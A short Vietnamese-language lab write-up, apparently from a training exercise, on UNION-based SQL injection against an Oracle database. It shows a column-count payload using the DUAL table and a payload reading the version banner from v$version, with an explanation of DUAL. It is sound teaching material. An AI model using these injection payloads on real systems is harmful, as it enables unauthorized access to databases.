![image](https://github.com/user-attachments/assets/1c48a1ae-b6fa-4717-8ed7-00b82d158940)

Lần này nó dùng dbms là oracle, và nó yêu cầu chúng ta phải lấy được version ra, vì oracal nó khá là khác so với các loại dbms khác nên ta phải xem docs để xem nó sqli như nào nhé, bạn có thể tham khảo link ref dưới đây

Payload:

```
' UNION SELECT null,null from dual--
```

![image](https://github.com/user-attachments/assets/e18b0640-1a5a-4ae9-932f-75715544157d)

Sau khi test thì ta có thể thấy được rằng nó đang sử dụng payload sau để kiểm tra số lượng cột mà truy vấn trả về. Thử dần với NULL thì ta biết được nó có 2 cột

Rồi tôi sẽ sơ qua lí thuyết về oracle cho bạn nhé.

Trong Oracle Database, DUAL là một bảng giả (pseudo-table) đặc biệt được sử dụng chủ yếu để truy vấn các giá trị hằng hoặc thực hiện các phép tính mà không cần tham chiếu đến một bảng thực. Nó rất hữu ích khi bạn muốn chạy một truy vấn mà không cần dữ liệu từ bảng nào khác.

Đặc điểm của bảng DUAL

+ Bảng DUAL được tạo sẵn trong Oracle Database.
+ Nó chứa đúng một dòng (row) và một cột (column) có tên là DUMMY với giá trị mặc định là 'X'.
+ Bạn không thể xóa hoặc chỉnh sửa bảng DUAL.

Ví dụ:

+ Input:

```
SELECT * FROM DUAL;
```

+ Output:

```
DUMMY
-----
X
```

Rồi bây giờ ta tiến hành lấy version dbms ra thôi.

Payload:

```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

+ BANNER: Đây là cột chứa thông tin phiên bản của cơ sở dữ liệu Oracle trong chế độ xem v$version.
+ v$version là một chế độ xem hệ thống trong Oracle Database, chứa thông tin về phiên bản và các thành phần liên quan của cơ sở dữ liệu.

Tóm lại chỉ là format thôi.

![image](https://github.com/user-attachments/assets/070471d6-5e72-48bd-8a6d-f174a4139255)

Done!
## REFERENCES
[1]. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md
